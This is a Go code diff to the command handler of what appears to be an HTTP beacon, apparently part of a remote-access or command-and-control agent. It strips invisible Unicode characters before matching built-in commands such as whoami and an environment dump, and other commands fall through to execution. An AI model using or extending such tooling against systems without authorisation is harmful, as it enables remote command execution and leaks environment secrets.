@@ -7,6 +7,7 @@ import (
 	"os/user"
 	"sort"
 	"strings"
+	"unicode"
 )
 
 // Built-in HTTP beacon commands (matched case-insensitively, whole string after trim — no extra args).
@@ -57,23 +58,43 @@ func builtinEnvironment() (string, error) {
 	return strings.Join(env, "\n") + "\n", nil
 }
 
-func normalizeBuiltinCommand(s string) string {
-	s = strings.TrimSpace(s)
-	s = strings.TrimPrefix(s, "\ufeff") // BOM from some JSON producers
-	return s
+func stripInvisibleRunes(s string) string {
+	var b strings.Builder
+	b.Grow(len(s))
+	for _, r := range s {
+		// Zero-width spaces and format chars break string equality but often collapse to one Fields() token.
+		switch r {
+		case '\u200b', '\u200c', '\u200d', '\ufeff':
+			continue
+		default:
+			if unicode.Is(unicode.Cf, r) {
+				continue
+			}
+			b.WriteRune(r)
+		}
+	}
+	return b.String()
 }
 
-// runBuiltinHTTPCommand runs a built-in command when the token matches. If handled is false, use ExecuteCommand.
+func normalizeBuiltinCommand(s string) string {
+	s = strings.TrimSpace(s)
+	s = strings.TrimPrefix(s, "\ufeff")
+	s = stripInvisibleRunes(s)
+	return strings.TrimSpace(s)
+}
+
+// runBuiltinHTTPCommand runs a built-in command when the token matches. If handled is false, use exec.
 func runBuiltinHTTPCommand(command string) (output string, err error, handled bool) {
 	s := normalizeBuiltinCommand(command)
 	if s == "" {
 		return "", nil, false
 	}
 	// Single-token only: do not treat "env -0" as builtin.
-	if len(strings.Fields(s)) != 1 {
+	fields := strings.Fields(s)
+	if len(fields) != 1 {
 		return "", nil, false
 	}
-	switch strings.ToLower(s) {
+	switch strings.ToLower(fields[0]) {
 	case "whoami":
 		out, e := builtinWhoami()
 		return out, e, true
